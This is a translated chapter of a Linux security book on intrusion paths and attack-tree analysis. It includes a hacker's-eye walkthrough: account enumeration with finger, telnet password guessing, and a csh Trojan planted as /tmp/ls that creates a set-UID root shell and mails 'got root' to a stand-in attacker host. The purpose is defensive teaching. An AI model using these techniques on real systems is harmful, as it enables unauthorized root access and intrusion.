

- “防火墙与企业护城河”见第 67 页
- “关闭不必要的服务”见第 80 页
- “高安全性要求最少服务”见第 87 页
- “用砖块替换这些薄弱的门”见第 88 页
- “新灯旧屋”见第 97 页
- “团结则倒，分裂则立”见第 109 页

## 2.1 理解 Linux 安全性

![](img/7d04225c75a86d3cf4bd6077596f35b2_33_0.png)

本章涵盖了 Linux 安全性背后的部分理念，同时也提供了观察安全性的创新视角。我们将探讨新的方法，以避免那种单一“墙壁”式的安全策略，这种策略允许该墙壁上的单一裂缝导致所有安全防护失效。Linux 基于 UNIX 安全模型。该模型由美国一些顶尖的博士级计算机科学家设计。它经过了 30 年的分析、开发和演变，参与者从著名学者到破解者，再到国防部及其他政府安全专家皆有参与。它经受住了时间的考验。

### 2.1.1 你身处一条蜿蜒小径的迷宫中

一个 Linux 系统是一个由蜿蜒小径组成的迷宫，每条路径都有未知的连接，以及强度不同的带锁大门。破解系统的道路可能漫长且曲折，拥有许多死胡同。这个迷宫如图 2.1 所示。

如图 2.1 所示，黑客只需要找到从互联网到“拥有”系统 root 账户或重要数据库的众多可能路径中的一条即可。图 2.1 中那些提供意外路径的房间，如果有其中任何一个被入侵，就是 Linux 系统被攻破的最常见方式。如果你发现系统中存在这些情况，你需要阅读本书的相关章节，以确保这些意外通道被阻断。这些最严重的漏洞也列在表 2.1 中。本章将讨论这些问题及其解决方案。

如表 2.1 所示，入侵 Linux 盒子的最常见途径是许多网站中的常见功能。你还可以看到，许多途径是有 bug 的系统软件或应用程序，而不仅仅是 SysAdmin（系统管理员）的简单“配置错误”。这意味着正确的系统配置还不够。你还需要订阅相关的安全邮件列表，并与你的用户和程序员合作，以实现系统的安全。以下是一个现实示例，展示了黑客如何寻找你系统的漏洞并利用它们进行入侵。

![](img/7d04225c75a86d3cf4bd6077596f35b2_34_0.png)

**图 2.1** 你身处一条蜿蜒小径的迷宫中。

### 表 2.1 最常见的 Linux 入侵方式

| 漏洞类型 | |
| :--- | :--- |
| 存在 bug 或配置错误的 DNS 或 Sendmail | 存在 bug 或配置错误的 FTP 守护进程 |
| 存在 bug 的 CGI 程序或配置错误的 Apache | 弱密码或缺失密码 |
| NFS、mountd 或 Sun 远程过程调用 | 存在 bug 的 set-UID 为 root 的程序 |
| 存在 bug 或配置错误的 POP 或 IMAP | Telnet |
| SNMP，特别是使用默认密码时 | |

如果这个例子让你感到害怕，或者它甚至可能在你的系统上起作用，那么你来对地方寻找解决方案了。如果这对你来说太基础了，请继续往下读，因为这里每个人都有所得。（在这个例子中，我们甚至不会尝试 CGI 程序或缓冲区溢出。）

> 本节标题的灵感来自电脑游戏 *Adventure*，在该游戏中，玩家探索一个拥有许多相互连接房间的地底魔法洞穴。许多大型旧建筑，包括城堡，也有类似的相互连接的房间和大厅。

黑客在一个安全配置不佳的系统中行走的可能路径可能是以下示例。为了更好地了解黑客的过程从而更好地进行防护，该示例是从黑客的视角叙述的。

1. 我们通过在另一个网站看到链接、收到来自该网站的电子邮件，或者仅仅听说 Pentacorp 这个名字，发现了主机名 `www.pentacorp.com`。

2. Ping 它以检查其是否存在。

```bash
$ ping www.pentacorp.com
PING www.pentacorp.com (216.247.56.62): 56 data bytes
64 bytes from 216.247.56.62: icmp_seq=0 ttl=55 time=189.4 ms
64 bytes from 216.247.56.62: icmp_seq=1 ttl=55 time=160.3 ms
```

> 由于许多网站正在禁用 ICMP 回显功能，`nslookup` 或 `traceroute` 更可能得出有效结果。除非网络故障，`nslookup` 始终能验证站点是否存在。使用 `traceroute` 可以测试连接性，如果出现问题，它会显示是哪个系统出了问题。

3. 我们检查它是否支持 `finger`。

```bash
$ finger root@www.pentacorp.com
[www.pentacorp.com]
Login: root               Name: root
Directory: /root         Shell: /bin/tcsh
Last login Wed Apr 5 11:33 (EDT) on tty2
```

> Pentacorp 和 Fly-By-Day Consulting 的名称是 Fly-By-Day Consulting, Inc. 的商标。

是的，SysAdmin 让我们能够看到系统管理员是否在系统上（他可能会注意到我们），并且允许我们猜测账户名称而不会报告这些猜测，这让事情变得容易了。

4. 尝试猜测账户名称。

因为许多人使用其账户名称和常用主机名作为电子邮件地址，黑客可以从电子邮件、阅读邮件列表和新闻组，以及使用网络搜索引擎获取这些信息。

```bash
$ finger ken@research.pentacorp.com
finger: ken: no such user.
$ finger dennis@research.pentacorp.com
finger: dennis: no such user.
$ finger bill@research.pentacorp.com
[www.pentacorp.com]
Login: bill
Directory: /home/bill
On since Sat Apr 1 13:40 (EDT) on tty1
```

```text
Name: Bill Sateg
Shell: /bin/tcsh
Idle 6 days 16 hours
```

我们找到了一个账户。太棒了。

5. 猜测 Bill 的密码。

```bash
$ telnet www.pentacorp.com
Trying 192.168.57.8...
Connected to www.pentacorp.com
www.pentacorp.com login: bill
Password: money
Login incorrect
```

```text
www.pentacorp.com login: bill
Password: 640k
You have new mail.
```

现在我们以普通用户身份登录。

6. 现在尝试成为 root。尝试猜测 root 的密码。对 `su` 进行 20 次错误猜测后放弃。这是一条死胡同。

7. 查看加密密码是否在 `/etc/passwd` 中。如果是，我们可以在自己的系统中破解它们。

```bash
% cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
ralph:x:101:100:daemon:/home/ralph:/bin/bash
bill:x:102:100:daemon:/home/bill:/bin/tcsh
```

糟糕。root 的密码字段中的 "x" 表明他们使用的是影子密码，包含在 `/etc/shadow` 中。另一条死胡同。

8. 查看 root 的 `$PATH` 变量说明什么。

```bash
% cat /root/.bash_profile
alias rm='rm -i'
alias ls='ls --color -F'
export PATH=.:/usr/local/bin:$PATH
```

完美。SysAdmin 将 `.` 包含在他的搜索路径中，并且位于 `/bin` 之前。这意味着，如果 root 发出命令 `ls`，并且当前目录中存在同名程序，那么 `/ls` 将被执行，而不是 `/bin/ls`。这是一个错误，而且很常见。（另一个常见错误是允许访问 `/root` 甚至允许写入权限。）

9. 在 `/tmp` 中设陷阱，留下 `ls`、`favorite_editor` 和 `other_editor` 的虚假版本，等待 root 走进那里。我们可以通过创建巨大文件来故意填满磁盘空间，或者我们在 `/tmp/ls` 中创建一个脚本，让 root 更快查看。

```csh
% cat > /tmp/ls
#!/bin/csh -f
# If root, go directly to finish to give up ls
if (! -o root) goto finish
# Copy the shell
cp /bin/sh .sh
# Make it set-UID root!!!
chmod 4755 .sh
# Send us e-mail when it happens
hostname | mail -s "got root" crackem.com
# Remove the Trojan horses
/bin/rm ls pwd
finish:
/bin/ls *
^D
% chmod 755 /tmp/ls
% cp /tmp/ls /tmp/vi
```

> 此环境变量列出了如果在命令名称中没有斜杠，应该搜索哪些目录以查找命令。

> 这段代码由作者编写，测试了正确操作，并几乎像书中展示的所有代码一样复制到手稿中。

### 2.1.2 攻击路径

在上一节中，你看到了如何可以将 Linux 或 UNIX 系统视为一个由蜿蜒小径组成的迷宫。对于没有深入研究过 Linux 或 UNIX 安全性的人来说，这可能看起来很令人困惑和混乱。

虽然这个类比将 Linux 比作迷宫，但它也适用于大多数其他现代操作系统，包括 UNIX、Windows、Windows NT 和 VMS。

你可能已经注意到，对于我们的假设黑客来说，这似乎并不令人困惑或混乱。这是因为他理解攻击路径的概念，并使用这种分析技术来寻找从他所在之处到他想要之处的路线，最好是拥有 root 访问权限。能够在他之前进行这种分析对你来说很有价值。基本思想是你从一个最终目标开始，即一个无需在计算机现场存在的 root shell。

你试图找到到达那里的可能路径的最后部分，以及每个替代方案的“成本”有多高。成本可能是“行走”该路径所需的时间。它可能是成本，例如破解密码所需的计算机有多强大，或者贿赂某人泄露 root 密码的成本，甚至安装电话窃听并连接调制解调器的成本。

接下来，绘制并分析到达这些最后段起点的路径及其成本。接下来，构思并分析到达这些路径的段及其成本。最终，你会到达你显然可以开始的起点。注意，当画出来时，这些路径看起来非常像树，是活的那种以及文件系统树。最后，你为每个可能路径的所有段添加成本。通往 root 的这些路径如图 2.2 所示。

如图 2.2 所示，这种分析方法显示了优点和缺点，假设你很好地理解系统的组件。问题如下：

1. 你找到了所有实际路径吗？这是最难回答的问题。
2. 哪些路径对黑客来说最容易跟随？
3. 是否有路径足够容易，以至于它们代表了重大的入侵风险？
4. 你如何消除这些路径或使黑客更难跟随它们？
5. 你如何迫使黑客经过一系列较难执行的路径序列以增加安全性？

Bruce Schneier，Counterpane Internet Security 的 CTO 以及著名安全专家，在 1999 年 12 月的 *Dr. Dobb's Journal* 上发表了题为“攻击树”的文章。他的文章为本节提供了一些灵感。

